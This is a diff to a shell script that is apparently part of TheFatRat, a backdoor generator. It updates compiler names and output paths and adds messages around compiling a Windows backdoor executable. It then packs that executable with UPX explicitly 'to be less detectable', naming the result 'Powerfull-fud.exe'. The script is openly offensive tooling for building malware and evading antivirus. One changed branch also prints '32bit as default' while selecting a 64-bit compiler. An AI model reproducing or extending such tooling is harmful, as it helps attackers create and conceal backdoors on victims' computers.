@@ -2,10 +2,11 @@
 file="config/config.path"
 if [ -f "$file" ]
 then
-msfconsole=`sed -n 14p $file`	
-msfvenom=`sed -n 15p $file`
-backdoor=`sed -n 16p $file`
-searchsploit=`sed -n 17p $file`
+msfconsole=$(sed -n 13p ${file})	
+msfvenom=$(sed -n 14p ${file})
+backdoor=$(sed -n 15p ${file})
+searchsploit=$(sed -n 16p ${file})
+output=$(sed -n 17p ${file})
 else
 	echo "Configuration file does not exists , run setup.sh first ."
 exit 1
@@ -50,7 +51,7 @@ comp="0"
 # Warn if the gcc-mingw32 package is not located here /usr/bin/i586-mingw32msvc-gcc
 # You may need to install the following on Kali Linux to compile the C to an Exe - "apt-get install gcc-mingw32"
 # check mingw if exists
-      which i586-mingw32msvc-gcc > /dev/null 2>&1
+      which i686-w64-mingw32-gcc > /dev/null 2>&1
       if [ "$?" -eq "0" ]
       then
       echo [✔]::[mingw32]: installation found!;
@@ -121,8 +122,8 @@ BlueF='\e[1;34m'
 yellow='\e[1;33m'
 orange='\e[38;5;166m'
 
-rm -f $path/output/Powerfull.exe >/dev/null 2>&1
-rm -f $path/output/Powerfull-fud.exe >/dev/null 2>&1
+rm -f $output/Powerfull.exe >/dev/null 2>&1
+rm -f $output/Powerfull-fud.exe >/dev/null 2>&1
 #Banner
 clear
 echo
@@ -171,7 +172,7 @@ fi
 echo ""
 if [ $comp == "1" ]
 then
-COMPILER="i586-mingw32msvc-gcc"
+COMPILER="i686-w64-mingw32-gcc"
 fi
 if [ $comp == "2" ]
 then
@@ -193,7 +194,7 @@ echo -ne $green "Choose (1 or 2) : " ;tput sgr0
 read archs
 case $archs in 
 1)
-COMPILER="i586-mingw32msvc-gcc"
+COMPILER="i686-w64-mingw32-gcc"
 echo ""
 echo -e $green "32bit Selected"
 sleep 1
@@ -205,7 +206,7 @@ echo -e $green "64bit Selected"
 sleep 1
 ;;
 *)
-COMPILER="i586-mingw32msvc-gcc"
+COMPILER="x86_64-w64-mingw32-gcc"
 echo ""
 echo -e $green "Invalid Option , setting 32bit as default"
 sleep 1
@@ -223,7 +224,7 @@ delayRandomness=32676	# The higher the delay the longer it will take to execute 
 
 #Set directory
 currentDir=`pwd`
-outputDir="${currentDir}/output/"
+outputDir="$output/"
 outputExe="${outputDir}Powerfull.exe"  # You can change the name of the executable on this line
 outputUPX="${outputDir}Powerfull-fud.exe"  # You can change the name of the executable on this line
 
@@ -349,6 +350,31 @@ while [[ ! -f "$outputExe" ]]; do
     $COMPILER -o $outputExe $cProg
 
 done
-
+if [[ -f "$outputExe" ]]
+then
+echo "Uncompressed backdoor created in : $outputExe"
+else
+echo "Unable to compile backdoor"
+echo -n "Press Enter to return to menu"
+read rsp
+exit 0
+fi
+echo ""
+echo -n "Compressing $outputExe with UPX to be less detectable ...."
 # Use UPX to create a second executable, testing...
-upx -q --ultra-brute -o $outputUPX $outputExe
+upx -q --ultra-brute -o $outputUPX $outputExe >/dev/null 2>&1
+echo "Done"
+
+if [[ -f "$outputUPX" ]]
+then
+echo "Compressed Backdoor was build in : $outputUPX"
+echo ""
+echo -n "Press Enter to return to fatrat menu"
+read rsp
+exit 0
+else
+echo "Unable to compress $outputExe with UPX"
+echo -n "Press Enter to return to fatrat menu"
+read rsp
+exit 0
+fi
